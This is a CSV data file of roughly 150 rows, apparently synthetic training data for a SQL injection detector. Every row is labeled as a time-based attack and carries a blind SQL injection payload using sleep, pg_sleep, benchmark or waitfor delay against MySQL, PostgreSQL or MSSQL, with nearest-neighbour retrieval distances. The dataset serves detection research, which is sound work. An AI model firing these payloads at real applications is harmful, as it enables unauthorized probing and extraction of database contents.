id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000349,attack,time,"1%""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000218,0.8048423150888775
SMOTE_000350,attack,time,"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000711,0.002260975950768299
SMOTE_000351,attack,time,"1"" and sleep  (  5  )  #",nearest_attack_euclidean,R000623,0.9653963154702646
SMOTE_000352,attack,time,"1"" waitfor delay '0:0:5'",nearest_attack_euclidean,R000743,0.2049865091336053
SMOTE_000353,attack,time,"1'  )   as mmhe where 2142  =  2142 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R001159,0.010793438333470094
SMOTE_000354,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,0.6849882639953773
SMOTE_000355,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000124,0.668546519716783
SMOTE_000356,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,0.2839525203346929
SMOTE_000357,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.3736685516869012
SMOTE_000358,attack,time,1%' rlike sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000930,0.9988804011180265
SMOTE_000359,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,0.6865544305232344
SMOTE_000360,attack,time,1'  )   where 4364  =  4364 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000492,0.2649697978104944
SMOTE_000361,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,0.9196826553484103
SMOTE_000362,attack,time,"1""  )   as lexx where 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R001126,0.4507513507083635
SMOTE_000363,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000579,1.3512755470961972
SMOTE_000364,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R001171,0.14746827397639056
SMOTE_000365,attack,time,"1%""   )    )    and sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000884,0.4485443583361736
SMOTE_000366,attack,time,"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd",nearest_attack_euclidean,R000407,0.3132515361449909
SMOTE_000367,attack,time,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'ckmm' like 'ckmm,nearest_attack_euclidean,R000248,0.48634153455120305
SMOTE_000368,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,0.14599595717712124
SMOTE_000369,attack,time,1'   )    )    rlike sleep  (  5  )  #,nearest_attack_euclidean,R000919,0.5016776671953443
SMOTE_000370,attack,time,1' rlike sleep  (  5  ) ,nearest_attack_euclidean,R000943,0.6158159204093545
SMOTE_000371,attack,time,1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000532,0.20404672577733457
SMOTE_000372,attack,time,"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000637,0.12331091494123053
SMOTE_000373,attack,time,"1%""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R001004,0.19632917730488716
SMOTE_000374,attack,time,"1'||  (  select 'ymac' from dual where 9268  =  9268 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",nearest_attack_euclidean,R000402,0.32101229676416543
SMOTE_000375,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,0.09703833875938361
SMOTE_000376,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'obwn'  =  'obwn,nearest_attack_euclidean,R000285,0.5532204512619917
SMOTE_000377,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,1.4003866775080673
SMOTE_000378,attack,time,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'ineq' like 'ineq,nearest_attack_euclidean,R000356,0.07495778967775597
SMOTE_000379,attack,time,"1""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000357,0.27018657242976424
SMOTE_000380,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R000786,0.6767256038449077
SMOTE_000381,attack,time,1'||  (  select 'xqqp' where 3007  =  3007 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000339,0.23358998262909392
SMOTE_000382,attack,time,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'cwjd'  =  'cwjd",nearest_attack_euclidean,R001075,0.7552138956435598
SMOTE_000383,attack,time,1' or sleep  (  5  )   and 'yudo'  =  'yudo,nearest_attack_euclidean,R000802,0.777798037107751
SMOTE_000384,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000634,0.5292922895826195
SMOTE_000385,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000633,0.08919454577812182
SMOTE_000386,attack,time,"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000957,0.5731598701691643
SMOTE_000387,attack,time,1' waitfor delay '0:0:5',nearest_attack_euclidean,R000895,1.0639449260568872
SMOTE_000388,attack,time,"1"" and sleep  (  5  )  #",nearest_attack_euclidean,R000623,0.6203332554033054
SMOTE_000389,attack,time,1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000472,0.6120980659807159
SMOTE_000390,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,0.8782068879013311
SMOTE_000391,attack,time,1 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000316,0.6498606617128396
SMOTE_000392,attack,time,select sleep  (  5  )   and 'gajm'  =  'gajm,nearest_attack_euclidean,R000207,0.15862274023984732
SMOTE_000393,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R000912,3.0156961829044984
SMOTE_000394,attack,time,1%'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R001113,0.4977229142470424
SMOTE_000395,attack,time,"1""   )    )    as yuqr where 7226  =  7226 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000955,0.1773358858544619
SMOTE_000396,attack,time,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,nearest_attack_euclidean,R000378,1.0313019679317437
SMOTE_000397,attack,time,"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000353,0.18891270223727583
SMOTE_000398,attack,time,select sleep  (  5  )   and    (    (   8679  =  8679,nearest_attack_euclidean,R000536,0.3480833765178225
SMOTE_000399,attack,time,"1'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000333,0.6412587166700173
SMOTE_000400,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ',nearest_attack_euclidean,R001010,0.1532985080338322
SMOTE_000401,attack,time,"1%"" and sleep  (  5  )  #",nearest_attack_euclidean,R001139,0.9398771621633234
SMOTE_000402,attack,time,1'+  (  select iowv where 6105  =  6105 and sleep  (  5  )  #,nearest_attack_euclidean,R000546,0.5875687605837231
SMOTE_000403,attack,time,"1"" waitfor delay '0:0:5' and ""syhx""  =  ""syhx",nearest_attack_euclidean,R001095,0.5001756499711875
SMOTE_000404,attack,time,select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,nearest_attack_euclidean,R000364,0.10552423882018833
SMOTE_000405,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000315,0.842732570304188
SMOTE_000406,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001146,1.0840422921126842
SMOTE_000407,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R000766,0.5859056946103397
SMOTE_000408,attack,time,"1""   )    )    as whyr where 9731  =  9731 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",nearest_attack_euclidean,R000666,0.23834053154454657
SMOTE_000409,attack,time,1'   )    )    as yqcl where 5026  =  5026 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000228,0.04879891973893558
SMOTE_000410,attack,time,1  )   as rlft where 1670  =  1670 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000343,0.10739897722977733
SMOTE_000411,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.09522946769019149
SMOTE_000412,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000142,0.010903717768603093
SMOTE_000413,attack,time,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000299,1.5201647152450146
SMOTE_000414,attack,time,1%'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R001078,0.06051913585960392
SMOTE_000415,attack,time,1  )   where 2734  =  2734 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000199,0.07246499953185893
SMOTE_000416,attack,time,1   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   9288  =  9288,nearest_attack_euclidean,R000897,0.03215754070752735
SMOTE_000417,attack,time,"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'subq' like 'subq",nearest_attack_euclidean,R000896,0.7767850657789891
SMOTE_000418,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,0.32082765657901363
SMOTE_000419,attack,time,"1"" where 2677  =  2677 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",nearest_attack_euclidean,R000345,0.13274671783824968
SMOTE_000420,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R000786,1.1776565186411445
SMOTE_000421,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R001119,0.5763634947631905
SMOTE_000422,attack,time,1 where 9393  =  9393 waitfor delay '0:0:5'--,nearest_attack_euclidean,R001138,0.08866979343828524
SMOTE_000423,attack,time,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'mqoj' like 'mqoj,nearest_attack_euclidean,R000946,0.2579934975167521
SMOTE_000424,attack,time,"1%'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R001167,0.9975462473595655
SMOTE_000425,attack,time,1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000854,0.28326886388579986
SMOTE_000426,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'zjun'  =  'zjun,nearest_attack_euclidean,R000853,0.09419268703876349
SMOTE_000427,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'cbaj'  =  'cbaj,nearest_attack_euclidean,R000611,0.3045976408044484
SMOTE_000428,attack,time,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",nearest_attack_euclidean,R000154,0.9569861956512917
SMOTE_000429,attack,time,1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,nearest_attack_euclidean,R000571,0.24533074647011546
SMOTE_000430,attack,time,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""djwo""  =  ""djwo",nearest_attack_euclidean,R000250,0.2640400845614478
SMOTE_000431,attack,time,"select pg_sleep  (  5  )   and   (  ""tpry""  =  ""tpry",nearest_attack_euclidean,R001080,0.9170332441761951
SMOTE_000432,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000886,0.46139497830966275
SMOTE_000433,attack,time,1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,nearest_attack_euclidean,R000185,0.045263388916575865
SMOTE_000434,attack,time,"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000329,0.4677994167602633
SMOTE_000435,attack,time,1'  )   waitfor delay '0:0:5',nearest_attack_euclidean,R000648,0.3873037007512707
SMOTE_000436,attack,time,"1' where 7464  =  7464 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000442,0.41149667354110514
SMOTE_000437,attack,time,"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000933,0.14796456127518598
SMOTE_000438,attack,time,1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000831,0.009330883791019257
SMOTE_000439,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,0.2043521689447075
SMOTE_000440,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000116,0.00433121458497886
SMOTE_000441,attack,time,"make_set  (  8734  =  8734,sleep  (  5   )    )   ",nearest_attack_euclidean,R001074,1.0999054217799684
SMOTE_000442,attack,time,1'  )   where 4364  =  4364 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000492,0.05822712589793179
SMOTE_000443,attack,time,1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000338,0.4877776544117504
SMOTE_000444,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000226,0.17952413587519306
SMOTE_000445,attack,time,"1'   )    )    as agdn where 8442  =  8442 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000703,0.4629888706933238
SMOTE_000446,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.17001646291179293
SMOTE_000447,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",nearest_attack_euclidean,R000269,0.18367906296499484
SMOTE_000448,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,0.35937198045968993
SMOTE_000449,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,0.31771756947084523
SMOTE_000450,attack,time,1'||  (  select 'tcfy' where 4546  =  4546 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000848,0.4352010849948882
SMOTE_000451,attack,time,waitfor delay '0:0:5' and   (  '%'  =  ',nearest_attack_euclidean,R000684,0.646292252540326
SMOTE_000452,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R000912,7.109337597351204
SMOTE_000453,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.34070463733026274
SMOTE_000454,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   -- ilfc",nearest_attack_euclidean,R000187,0.342560087914038
SMOTE_000455,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'vnkr' like 'vnkr,nearest_attack_euclidean,R001013,0.10813864138427226
SMOTE_000456,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R000289,0.8471904408305453
SMOTE_000457,attack,time,1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'pemj'  =  'pemj,nearest_attack_euclidean,R000237,0.08989175048864224
SMOTE_000458,attack,time,"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R001024,0.30034083111932464
SMOTE_000459,attack,time,1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000541,0.5278613415893713
SMOTE_000460,attack,time,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000509,0.2825890719527489
SMOTE_000461,attack,time,"1%"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R000881,0.7783521239338476
SMOTE_000462,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,0.02745421374021334
SMOTE_000463,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000686,0.052734383602707574
SMOTE_000464,attack,time,"1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000860,0.8740329480635275
SMOTE_000465,attack,time,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",nearest_attack_euclidean,R000121,1.157479327920487
SMOTE_000466,attack,time,1 and sleep  (  5  )  #,nearest_attack_euclidean,R001055,0.6745284948160137
SMOTE_000467,attack,time,1'  )   as hqaq where 6411  =  6411 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001166,0.6631283621081714
SMOTE_000468,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000632,0.35988013315162826
SMOTE_000469,attack,time,"1%'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000626,0.03270864753033981
SMOTE_000470,attack,time,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000078,0.12518608395843306
SMOTE_000471,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb",nearest_attack_euclidean,R001081,0.6918570496977063
SMOTE_000472,attack,time,"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R001089,1.2221038140196818
SMOTE_000473,attack,time,"1""  )   where 6843  =  6843 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000363,0.26685038829908475
SMOTE_000474,attack,time,1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000317,0.4831193798863124
SMOTE_000475,attack,time,"1' where 3339  =  3339 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000413,0.24241858472028657
SMOTE_000476,attack,time,"1',  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R001116,0.5197325450301752
SMOTE_000477,attack,time,"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'jfwt' like 'jfwt",nearest_attack_euclidean,R000640,0.7975305955741883
SMOTE_000478,attack,time,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""afby""  =  ""afby",nearest_attack_euclidean,R000467,0.6183104213122929
SMOTE_000479,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",nearest_attack_euclidean,R000269,0.2903895047060479
SMOTE_000480,attack,time,1' where 1045  =  1045 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001178,0.13448212397744255
SMOTE_000481,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.7538878996663056
SMOTE_000482,attack,time,"1,  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R000722,0.00015145661041321442
SMOTE_000483,attack,time,"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000637,0.501121699377195
SMOTE_000484,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""tuhy"" like ""tuhy",nearest_attack_euclidean,R001109,0.4285025367243058
SMOTE_000485,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb",nearest_attack_euclidean,R001081,0.5639732690616331
SMOTE_000486,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",nearest_attack_euclidean,R000261,0.9068001124424193
SMOTE_000487,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",nearest_attack_euclidean,R000129,0.1995024916650393
SMOTE_000488,attack,time,"select pg_sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000347,1.1407732722244233
SMOTE_000489,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,0.5118602795007378
SMOTE_000490,attack,time,"waitfor delay '0:0:5' and    (    (   ""ykgm""  =  ""ykgm",nearest_attack_euclidean,R000923,0.5284077233029487
SMOTE_000491,attack,time,"1""  )   where 6236  =  6236 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000389,0.19026206392586525
SMOTE_000492,attack,time,"1   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   8024  =  8024",nearest_attack_euclidean,R000646,0.36767948433604786
SMOTE_000493,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",nearest_attack_euclidean,R000690,0.5756233263251042
SMOTE_000494,attack,time,"1%'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000375,0.48830711379648445
SMOTE_000495,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,1.3904337706640362
SMOTE_000496,attack,time,1'||  (  select 'tznb' from dual where 8808  =  8808 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000270,1.0034672548770918
SMOTE_000497,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",nearest_attack_euclidean,R001147,0.26576809883472297
SMOTE_000498,attack,time,1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000875,0.5356220170573082
SMOTE_000499,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,0.19785466701473986
SMOTE_000500,attack,time,1'  )   where 2928  =  2928 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000859,0.05786824637065787
